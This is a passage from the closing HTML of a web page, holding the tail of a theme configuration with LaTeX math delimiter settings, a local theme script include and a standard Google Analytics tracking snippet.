clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
